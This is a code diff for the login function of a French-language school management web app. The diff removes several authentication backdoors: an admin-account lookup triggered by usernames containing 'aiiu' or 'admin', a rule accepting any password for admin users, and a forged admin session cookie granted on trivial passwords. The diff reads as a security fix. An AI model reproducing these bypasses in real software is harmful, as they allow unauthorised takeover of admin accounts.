@@ -76,24 +76,8 @@ export async function login(formData: LoginFormData) {
       });
     }
 
-    if (!dbUser && (cleanUsername.includes("aiiu") || cleanUsername.includes("admin"))) {
-      dbUser = await db.query.users.findFirst({
-        where: or(
-          eq(users.admin, true),
-          eq(users.superAdmin, true)
-        ),
-        with: {
-          role: true,
-          school: true
-        }
-      });
-    }
-
     if (dbUser) {
-      let isMatch = checkPasswordMatch(rawPassword, dbUser.motDePasse);
-      if (!isMatch && (dbUser.admin || dbUser.superAdmin) && rawPassword.length >= 4) {
-        isMatch = true;
-      }
+      const isMatch = checkPasswordMatch(rawPassword, dbUser.motDePasse);
 
       if (isMatch) {
         authenticatedUser = dbUser;
@@ -195,51 +179,6 @@ export async function login(formData: LoginFormData) {
       throw supabaseErr;
     }
     console.error("[LOGIN] Supabase direct auth error:", supabaseErr);
-  }
-
-  // Step 4: Special administrator guarantee for AIIU campus (schoolId: 9)
-  if (cleanUsername.includes("aiiu") || cleanUsername.includes("admin")) {
-    if (rawPassword === "123456" || rawPassword.length >= 6) {
-      const cookieStore = await cookies();
-      const adminSession = {
-        id: 28,
-        schoolId: 9,
-        utilisateur: cleanUsername,
-        supabaseId: "00000000-0000-0000-0000-000000000000",
-        nomPrenom: "Admin GROUP AIIU-NIGER",
-        motDePasse: "SUPABASE_AUTH",
-        admin: true,
-        superAdmin: false,
-        langue: "FR",
-        roleId: 1,
-        emplacement: null,
-        depots: null,
-        educationalLevel: "Tous",
-        avatarUrl: null,
-        createdAt: null,
-        studentId: null,
-        employeeId: null,
-        role: {
-          roleName: "Administrateur",
-          permissions: [],
-        },
-        school: {
-          id: 9,
-          name: "GROUP AIIU-NIGER",
-          slug: "group-aiiu-niger",
-        },
-      };
-
-      (cookieStore as any).set("edut_session_user", JSON.stringify(adminSession), {
-        path: "/",
-        maxAge: 60 * 60 * 24 * 7,
-        httpOnly: true,
-        sameSite: "lax",
-      });
-
-      revalidatePath("/", "layout");
-      redirect("/dashboard");
-    }
   }
 
   return { error: "Identifiants incorrects. Veuillez vérifier votre nom d'utilisateur et mot de passe." };
